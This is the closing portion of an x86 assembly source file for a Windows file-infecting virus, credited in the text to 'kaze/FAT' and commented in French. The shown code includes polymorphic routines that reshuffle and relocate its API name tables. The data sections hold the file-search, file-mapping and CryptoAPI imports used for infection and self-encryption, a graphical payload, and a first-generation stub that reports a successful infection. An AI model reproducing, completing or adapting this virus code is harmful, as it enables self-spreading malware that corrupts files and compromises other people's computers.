        mov eax,edx
        call r_range
        or eax,eax
        jp a3                   ;si pair, alors on ‚change pas ...
        jecxz a4                ;si plus qu'un nom, on echange pas
        dec ecx
        jecxz a3
        add edx,4               ;on inverse les deux noms d'api
        call recopie_api        ;et on update la table en consequence
        sub edx,8               ;la deuxieme en premiere place ...
        call recopie_api
        add edx,4
        jmp a5
a3:     call recopie_api        ;on ‚change pas ...
        jecxz a4
a5:     loop a1
a4:     pop esi                 
        pop edi
        mov ecx,poly_table_len  ;on recopie le tout
        rep movsb

b0:     pop esi
        mov ecx,8
        mov edi,esi
b1:     lodsd
        sub eax,[ebp+saved_imagebase]
        sub eax,[ebp+saved_virusrva]
        add eax,[ebp+imagebase]
        add eax,[ebp+virusrva]
        stosd
        loop b1
        popa
        ret
mix_table endp

recopie_api proc near   
        mov esi,[edx]           ;alors on avance d'un nom
        push edi
        movsd
ra1:    lodsb                   ;recopie la chaine jusqu'au zero
        stosb
        test al,al
        jnz ra1
        pop eax
        sub eax, offset poly_table2 - offset poly_table
        mov [edx],eax
        add edx,4
        ret
recopie_api endp

restore_table_rvas proc near    ;oblig‚ d'appeler cette focntion aprŠs
                                ;mix_table, sinon les rvas se faussent
        pusha
        lea esi,[ebp+table_name]
        mov ecx,8
b2:
        mov edi,esi
        lodsd
        sub eax,[ebp+imagebase]
        sub eax,[ebp+virusrva]
        add eax,[ebp+saved_imagebase]
        add eax,[ebp+saved_virusrva]
        stosd
        loop b2
        popa
        ret
restore_table_rvas endp


;============================================================================
;                                   DATA
;============================================================================

; pour la payload ....
Label SinCos byte       ; 256 values
db 0,3,6,9,12,15,18,21,24,28,31,34,37,40,43,46
db 48,51,54,57,60,63,65,68,71,73,76,78,81,83,85,88
db 90,92,94,96,98,100,102,104,106,108,109,111,112,114,115,117
db 118,119,120,121,122,123,124,124,125,126,126,127,127,127,127,127
db 127,127,127,127,127,127,126,126,125,124,124,123,122,121,120,119
db 118,117,115,114,112,111,109,108,106,104,102,100,98,96,94,92
db 90,88,85,83,81,78,76,73,71,68,65,63,60,57,54,51
db 48,46,43,40,37,34,31,28,24,21,18,15,12,9,6,3
db 0,-3,-6,-9,-12,-15,-18,-21,-24,-28,-31,-34,-37,-40,-43,-46
db -48,-51,-54,-57,-60,-63,-65,-68,-71,-73,-76,-78,-81,-83,-85,-88
db -90,-92,-94,-96,-98,-100,-102,-104,-106,-108,-109,-111,-112,-114,-115,-117
db -118,-119,-120,-121,-122,-123,-124,-124,-125,-126,-126,-127,-127,-127,-127,-127
db -127,-127,-127,-127,-127,-127,-126,-126,-125,-124,-124,-123,-122,-121,-120,-119
db -118,-117,-115,-114,-112,-111,-109,-108,-106,-104,-102,-100,-98,-96,-94,-92
db -90,-88,-85,-83,-81,-78,-76,-73,-71,-68,-65,-63,-60,-57,-54,-51
db -49,-46,-43,-40,-37,-34,-31,-28,-24,-21,-18,-15,-12,-9,-6,-3,0


credits db "Win32.lusion Coded by kaze"
len_credits equ $ - offset credits
points          dd 40,40,14
                dd 40,40,-14
                dd -40,40,-14 
                dd 40,-40,-14 
                dd 30,10,20
                dd 0,50,20
                dd -20,-10,-1

nbr_points equ ($-offset points)/12


blob    dw 01F8h
        dw 03FCh
        dw 07FEh
        dw 07FEh
        dw 0FFFh     
        dw 0FFFh
        dw 0FFFh
        dw 0FFFh
        dw 07FEh
        dw 07FEh
        dw 03FCh
        dw 01F8h

;pour le virus ...
of_oldgpa_name          dd 0
of_oldgmha_name         dd 0

disque                  db 'B:\',0            ; 'C' - 1
mask                    db 'kaze*.*',0
dmask                   db '*',0
dotdot                  db '..',0
AncienEP                dd 1000h + (offset premiere_fin - offset first_gen_start)
imagebase               dd 400000h
virusrva                dd 1000h + 5 ;(jmp du debut en +)

table_name      dd offset AContext  ;Aide … changer l'orde des chaines
                dd offset CHash     ;non cryptees en gardant en memoire leur   
                dd offset HData     ;adresse, modifiee a chaque gen.
                dd offset DKey
                dd offset Decrypt
                dd offset import_gmha
                dd offset import_gpa
                dd offset advapi_name

api2 db 'ExitProcess',0
api3 db 'GetDriveTypeA',0
api4 db 'FindFirstFileA',0
api5 db 'GetWindowsDirectoryA',0
api6 db 'SetCurrentDirectoryA',0
api7 db 'GetLocalTime',0
api8 db 'FindClose',0
api9 db 'CloseHandle',0
apiA db 'CreateFileA',0
apiB db 'SetFileAttributesA',0
apiC db 'FindNextFileA',0
apiD db 'MapViewOfFile',0
apiE db 'CreateFileMappingA',0
apiF db 'UnmapViewOfFile',0
apiG db 'LocalAlloc',0
apiH db 'Sleep',0
apiI db 'CreateThread',0
apiJ db 'ExitThread',0
apiK db 'GetProcAddress',0
NBR_APIS_KERNEL32       EQU 19

apiu1 db 'GetDC',0
NBR_APIS_USER32         EQU 1

apig1 db 'StretchDIBits',0
apig2 db 'TextOutA',0
NBR_APIS_GDI32          EQU 2


kernel_name             db 'kernel32.dll',0
user32_name             db 'user32.dll',0
gdi32_name              db 'gdi32.dll',0
of_gmha                 dd offset firstgen_GetModuleHandleA 
of_gpa                  dd offset firstgen_GetProcAddress 
Encrypt                 db 'CryptEncrypt',0

encrypted_stuff_len equ $ - offset encrypted_stuff

;============================================================================
;                               PARTIE NON CRYPTEE   
;============================================================================


poly_table:                     ;ce sont ces chaines dont mix_table
                                ;change l'orde car ici c'est en clair

AContext                db 'CryptAcquireContextA',0
CHash                   db 'CryptCreateHash',0
HData                   db 'CryptHashData',0
DKey                    db 'CryptDeriveKey',0
Decrypt                 db 'CryptDecrypt',0
NBR_APIS_ADVAPI32 EQU 5
import_gmha             db 0,0,'LoadLibraryA',0
import_gpa              db 0,0,'GetProcAddress',0
advapi_name             db 'advapi32.dll',0
poly_table_len equ $ - offset poly_table

len                     dd encrypted_stuff_len

virus_len equ $ - offset start

;============================================================================
;                                   BSS
;============================================================================

heap_start      equ $
ALIGN DWORD

Xcos                    dd ?
Xsin                    dd ?
Ycos                    dd ?
Ysin                    dd ?
Zcos                    dd ?
Zsin                    dd ?
Xangle                  dd ?
Yangle                  dd ?
Zangle                  dd ?

hwnd                    dd ?
hdc1                    dd ?
adrord                  dd ?
bmp_header              dd ?
bmp_buffer              dd ?
random                  dd ?
Thread_P                dd ?    ;thread parameter
Thread_I                dd ?    ;thread ID


hash                    dd ?
key                     dd ?
csp                     dd ?
api                     dd ?

saved_AncienEP          dd ?
saved_imagebase         dd ?
saved_virusrva          dd ?


Shandle                 dd ?
MShandle                dd ?
Fhandle                 dd ?
Mhandle                 dd ?
MapOff                  dd ?

alignement              dd ?
tailleajustee           dd ?
sectionaddr             dd ?
adr_k32                 dd ?
iidrva                  dd ?
iidraw                  dd ?

; KERNEL32.DLL
ExitP                   dd ?
GDT                     dd ?
FindFirstFile           dd ?
GetWindowsDirectory     dd ?
SetCurrentDirectory     dd ?
GLTime                  dd ?
FindClose               dd ?
CloseHandle             dd ?
CreateFile              dd ?       
SFA                     dd ?
FindNextFile            dd ?
MVOFile                 dd ?
CreateFileMapping       dd ?
UMVOFile                dd ?
LAlloc                  dd ?
Sleep                   dd ?
CThread                 dd ?
EThread                 dd ?
GPAddress               dd ?

;USER32.DLL
GDC                     dd ?

;GDI32.DLL
SDIBits                 dd ?
TOutA                   dd ?


;ADVAPI32.DLL
CEncrypt                dd ?
CAContext               dd ?
CCHash                  dd ?
CHData                  dd ?
CDKey                   dd ?

time_struc:
annee                   dw ?
mois                    dw ?
jourdelasem             dw ?
jour                    dw ?
heure                   dw ?
minute                  dw ?
seconde                 dw ?
milli                   dw ?

WFD label   byte
WFD_dwFileAttributes    dd      ?
WFD_ftCreationTime      dd      ?
                        dd      ?
WFD_ftLastAccessTime    dd      ?
                        dd      ?            
WFD_ftLastWriteTime     dd      ?
                        dd      ?
WFD_nFileSizeHigh       dd      ?
WFD_nFileSizeLow        dd      ?
WFD_dwReserved0         dd      ?
WFD_dwReserved1         dd      ?
WFD_szFileName          db      260 dup (?)
WFD_szAlternateFileName db      13 dup (?)
                        db      03 dup (?)

SavedDirectory          db 260 dup (?)

poly_table2 db poly_table_len dup (?)

heap_len equ $ - heap_start


;============================================================================
;                                   PREMIERE GENERATION
;============================================================================

firstgen_GetModuleHandleA       dd offset GetModuleHandleA 
firstgen_GetProcAddress         dd offset GetProcAddress

titre           db 'Win32.LN   coded by kaze/FAT ',0
all_ok          db 'Infection reussie ! Taille du virus : '
taille_virus    db virus_len/10000+48,(virus_len MOD 10000)/1000+48,(virus_len MOD 1000)/100+48,(virus_len MOD 100)/10+48,virus_len MOD 10+48,0
premiere_fin:       

                
                xor ebx,ebx
                push ebx
                push offset titre
                push offset all_ok
                push ebx
                call MessageBoxA
                push ebx                
                call ExitProcess


end first_gen_start

